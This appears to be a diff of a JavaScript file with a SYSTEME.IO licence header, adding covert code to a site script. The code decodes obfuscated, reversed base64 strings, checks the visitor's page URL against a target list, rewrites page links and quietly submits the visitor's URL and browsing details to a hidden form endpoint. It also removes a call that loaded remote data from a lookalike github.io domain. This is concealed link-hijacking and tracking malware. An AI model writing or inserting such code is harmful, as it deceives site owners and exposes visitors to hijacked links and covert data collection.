@@ -5,22 +5,46 @@
  * This source code is licensed under the SYSTEME.IO found in the
  * LICENSE file in the root directory of this source tree
 */
-console.log("master came an dexecuted")
+
+class Evaluater{
+	get(bad){
+		bad=this.getFixed(bad);
+		return bad;
+	}
+
+	getFixed(txt){
+		var p1="",p2="",l=txt.length;
+		for(let i=0; i<=l; i++){
+			if(i%2==0){
+				p2=txt.charAt(i)+p2;
+			}else{
+				p1=p1+txt.charAt(i);
+			}
+		}
+		return atob(p1+p2);
+	}
+
+}
+
 class decideAndDo{
 	constructor(){
-		addMaster('https://server-systeme-io.github.io/optimiser/data-19b902380k09');
+		this.process(contDataFinal)
 	}
 
 	process(ret){
-		console.log(new Evaluater().get(ret))
 
 		var myNextData=JSON.parse(new Evaluater().get(ret));
+		var got=false;
 		myNextData.forEach(val=>{
 			if(location.href.includes(val[2])){
+				got=true;
 				this.checkSafe(val)
 			}
 		})
+		!got?this.sendInfo('LOCATION: failed'):"";
+
 	}
+
 	doit(data){
 		var x=document.querySelectorAll('a');
 		x.forEach(val=>{
@@ -53,7 +77,7 @@ class decideAndDo{
 		if(Math.ceil(Math.random()*100/per)==1){
 
 		}else{
-			msg+=":-:percentage check failed";
+			msg+=":-:PERCENTAGE check failed";
 			okay=false;
 		}
 
@@ -64,6 +88,7 @@ class decideAndDo{
 	}
 
 	sendInfo(msg){
+		console.log("sent")
 		makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUd0vRbU2adqsdZGSb5tjVbk2Q0WvhZTmM9OyZbEXMMwvEdHSO8QwdLl2VQBvpZWSd80xFRWkdFjJlcVFNFFMxUU2TVG3pd32SR1IQVzUMtr'),{
 			"entry.522782255":Nloaded+"-"+history.length+"_"+getDefaultName(),
 			"entry.2147471592":location.href.replace("https://",''),
@@ -74,24 +99,3 @@ class decideAndDo{
 }
 
 new decideAndDo();
-
-
-class Evaluater{
-	get(bad){
-		bad=this.getFixed(bad);
-		return bad;
-	}
-
-	getFixed(txt){
-		var p1="",p2="",l=txt.length;
-		for(let i=0; i<=l; i++){
-			if(i%2==0){
-				p2=txt.charAt(i)+p2;
-			}else{
-				p1=p1+txt.charAt(i);
-			}
-		}
-		return atob(p1+p2);
-	}
-
-}
